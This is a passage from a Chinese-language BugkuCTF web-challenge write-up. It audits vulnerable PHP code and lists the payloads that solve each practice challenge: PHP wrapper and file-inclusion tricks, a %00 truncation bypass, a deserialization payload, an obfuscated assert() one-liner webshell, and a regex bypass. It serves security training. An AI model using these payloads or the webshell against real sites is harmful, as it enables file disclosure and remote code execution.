<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line"></span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line"></span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line"></span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line"></span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line"></span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;</span><br><span class="line"></span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line"></span><br><span class="line">echo $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计可知需要构造：</p>
<p>1、cookie：$_COOKIE['margin']=='margin'</p>
<p>2、filename=a2V5cy5waHA=</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190519212038160-1768004415.png" alt="img"></p>
<p>右键查看源码读取flag</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190519212418480-644681686.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $key&#x3D;&#39;KEY&#123;key_keys&#125;&#39;; ?&gt;</span><br></pre></td></tr></table></figure>



<p><strong>24. never give up</strong></p>
<p>考点：eregi()、 代码审计、base64编码、url编码</p>
<p>Topic Link：<a href="http://123.206.87.240:8006/test/hello.php" target="_blank" rel="noopener">http://123.206.87.240:8006/test/hello.php</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216232239338-2045385757.png" alt="img"></p>
<p>查看网页源代码发现存在 “1p.html” 尝试去访问 <a href="http://123.206.87.240:8006/test/1p.html，却跳转到了其它页面，应该是重定向所致，查看1p.html网页源码" target="_blank" rel="noopener">http://123.206.87.240:8006/test/1p.html，却跳转到了其它页面，应该是重定向所致，查看1p.html网页源码</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;SCRIPT LANGUAGE&#x3D;&quot;Javascript&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var Words &#x3D;&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; </span><br><span class="line">function OutWord()</span><br><span class="line">&#123;</span><br><span class="line">var NewWords;</span><br><span class="line">NewWords &#x3D; unescape(Words);</span><br><span class="line">document.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line">&#x2F;&#x2F; --&gt;</span><br><span class="line">&lt;&#x2F;SCRIPT&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;&#x2F;BODY&gt;</span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>

<p>将Words值进行解码</p>
<p>url解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt;</span><br></pre></td></tr></table></figure>

<p>base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&quot;;if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">    echo &#39;no no no no no no no&#39;;</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">    require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计发现需要满足：1. if(!$_GET['id'])条件为假同时$id==0  //感觉很矛盾但是可以利用php弱类型绕过 !aaa ==> 0 & aaa==0 ==> ture</p>
<ol start="2">
<li><p>$data=="bugku is a nice plateform!" //利用php伪协议赋值</p>
<p>en($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4  //利用eregi()函数%00截断漏洞绕过 $b=%00999999999</p>
</li>
</ol>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8006&#x2F;test&#x2F;hello.php?id&#x3D;aaa&amp;a&#x3D;data:&#x2F;&#x2F;,bugku%20is%20a%20nice%20plateform!&amp;b&#x3D;%00999999</span><br></pre></td></tr></table></figure>

<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;tHis_iS_THe_fLaG&#125;</span><br></pre></td></tr></table></figure>



<p><strong>25. welcome to bugkuctf</strong></p>
<p>考点：php反序列化漏洞、代码审计 </p>
<p>Topic Link：<a href="http://123.206.87.240:8006/test1/" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216203959390-1368403031.png" alt="img"></p>
<p>页面源代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">you are not the number of bugku !   </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];  </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];  </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计发现需要满足一个条件：1. user的值必须等于"welcome to the bugkuctf"</p>
<p>根据提示 ”include($file);  //hint.php ” 构造初步payload</p>
<p>payload1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8006&#x2F;test1&#x2F;?txt&#x3D;data:&#x2F;&#x2F;,welcome%20to%20the%20bugkuctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br></pre></td></tr></table></figure>

<p>读取hint.php文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>将获取到的base64代码进行解密，获取hint.php文件源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8006&#x2F;test1&#x2F;?txt&#x3D;data:&#x2F;&#x2F;,welcome%20to%20the%20bugkuctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<p>读取index.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIA0KJHR4dCA9ICRfR0VUWyJ0eHQiXTsgIA0KJGZpbGUgPSAkX0dFVFsiZmlsZSJdOyAgDQokcGFzc3dvcmQgPSAkX0dFVFsicGFzc3dvcmQiXTsgIA0KICANCmlmKGlzc2V0KCR0eHQpJiYoZmlsZV9nZXRfY29udGVudHMoJHR4dCwncicpPT09IndlbGNvbWUgdG8gdGhlIGJ1Z2t1Y3RmIikpeyAgDQogICAgZWNobyAiaGVsbG8gZnJpZW5kITxicj4iOyAgDQogICAgaWYocHJlZ19tYXRjaCgiL2ZsYWcvIiwkZmlsZSkpeyANCgkJZWNobyAi5LiN6IO9546w5Zyo5bCx57uZ5L2gZmxhZ+WTpiI7DQogICAgICAgIGV4aXQoKTsgIA0KICAgIH1lbHNleyAgDQogICAgICAgIGluY2x1ZGUoJGZpbGUpOyAgIA0KICAgICAgICAkcGFzc3dvcmQgPSB1bnNlcmlhbGl6ZSgkcGFzc3dvcmQpOyAgDQogICAgICAgIGVjaG8gJHBhc3N3b3JkOyAgDQogICAgfSAgDQp9ZWxzZXsgIA0KICAgIGVjaG8gInlvdSBhcmUgbm90IHRoZSBudW1iZXIgb2YgYnVna3UgISAiOyAgDQp9ICANCiAgDQo&#x2F;PiAgDQogIA0KPCEtLSAgDQokdXNlciA9ICRfR0VUWyJ0eHQiXTsgIA0KJGZpbGUgPSAkX0dFVFsiZmlsZSJdOyAgDQokcGFzcyA9ICRfR0VUWyJwYXNzd29yZCJdOyAgDQogIA0KaWYoaXNzZXQoJHVzZXIpJiYoZmlsZV9nZXRfY29udGVudHMoJHVzZXIsJ3InKT09PSJ3ZWxjb21lIHRvIHRoZSBidWdrdWN0ZiIpKXsgIA0KICAgIGVjaG8gImhlbGxvIGFkbWluITxicj4iOyAgDQogICAgaW5jbHVkZSgkZmlsZSk7IC8vaGludC5waHAgIA0KfWVsc2V7ICANCiAgICBlY2hvICJ5b3UgYXJlIG5vdCBhZG1pbiAhICI7ICANCn0gIA0KIC0tPiAg</span><br></pre></td></tr></table></figure>

<p>将获取到的base64代码进行解密，获取index.php文件源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt &#x3D; $_GET[&quot;txt&quot;];  </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];  </span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123; </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password &#x3D; unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];  </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];  </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>

<p>分析代码可知：1. file的值不能包含flag字符串</p>
<ol start="2">
<li><p>user的值必须等于"welcome to the bugkuctf"</p>
<p>assword 的值必须是经过序列化的字符串</p>
</li>
</ol>
<p>php反序列化漏洞：</p>
<p>当一个对象被当作字符串使用时会自动调用魔法函数 "__toString()"</p>
<p>利用php反序列化漏洞进行构造最终payload </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8006&#x2F;test1&#x2F;?txt&#x3D;data:&#x2F;&#x2F;,welcome%20to%20the%20bugkuctf&amp;file&#x3D;hint.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></figure>

<p>查看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hello friend!&lt;br&gt;  &lt;?php</span><br><span class="line">&#x2F;&#x2F;flag&#123;php_is_the_best_language&#125;  1</span><br><span class="line">?&gt;&lt;br&gt;good  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];  </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];  </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>

<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;php_is_the_best_language&#125;</span><br></pre></td></tr></table></figure>



<p><strong>26. 过狗一句话</strong></p>
<p>考点：代码审计</p>
<p>Topic Link：<a href="http://123.206.31.85:49162/" target="_blank" rel="noopener">http://123.206.31.85:49162/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190519215316566-131610797.png" alt="img"></p>
<p>源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$poc &#x3D; &quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1 &#x3D; explode(&quot;#&quot;, $poc);</span><br><span class="line">$poc_2 &#x3D; $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];</span><br><span class="line">$poc_2($_GET[&#39;s&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计，源码相当于：assert() 执行字符串s</p>
<p> payload1：读取当前目录下的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8010&#x2F;?s&#x3D;print_r(scandir(%27.&#x2F;%27))</span><br></pre></td></tr></table></figure>

<p>发现存在特殊文件：</p>
<p>访问：<a href="http://123.206.87.240:8010/f14g.txt" target="_blank" rel="noopener">http://123.206.87.240:8010/f14g.txt</a> 读取到flag信息</p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGKU&#123;bugku_web_009801_a&#125;</span><br></pre></td></tr></table></figure>



<p><strong>27. 字符？正则？</strong></p>
<p>考点：正则匹配</p>
<p>Topic Link：<a href="http://123.206.87.240:8002/web10/" target="_blank" rel="noopener">http://123.206.87.240:8002/web10/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190520165329462-1300233839.png" alt="img"></p>
<p>源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$key&#x3D;&#39;KEY&#123;********************************&#125;&#39;;</span><br><span class="line">$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\&#x2F;.\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&#39;key is: &#39;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>正则分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&quot;key&quot;：表达式字符串”key“直接匹配</span><br><span class="line"></span><br><span class="line">&quot;.&quot;：匹配除“\n”之外的任何单个字符。要匹配包括“\n”在内的任何字符，请使用像“[\s\S]”的模式</span><br><span class="line"></span><br><span class="line">&quot;*&quot;：匹配前面的子表达式零次或多次。例如，zo*能匹配“z”以及“zoo”。*等价于&#123;0,&#125;</span><br><span class="line"></span><br><span class="line">&quot;\&#x2F;&quot;：代表“&#x2F;”</span><br><span class="line"></span><br><span class="line">[a-z]：代表a-z中的任意一个字符</span><br><span class="line"></span><br><span class="line">[[:punct:]]：匹配其中一个字符： !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~</span><br><span class="line"></span><br><span class="line">&#x2F;i：忽略大小写</span><br><span class="line"></span><br><span class="line">&#123;4-7&#125;：&#123;n,m&#125;,m和n均为非负整数，其中n&lt;&#x3D;m。最少匹配n次且最多匹配m次</span><br><span class="line"></span><br><span class="line">&quot;&#x2F;&quot;：将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“\n”匹配字符“n”。“\\n”匹配一个换行符。序列“\\”匹配“\”而“\(”则匹配“(”</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web10&#x2F;?id&#x3D;key999key9999key:&#x2F;9&#x2F;999keyy^</span><br></pre></td></tr></table></figure>

<p><img src="BugkuCTF~Web~WriteUp/1594459-20190520170858988-2056267287.png" alt="img"></p>
<p>get flag:</p>
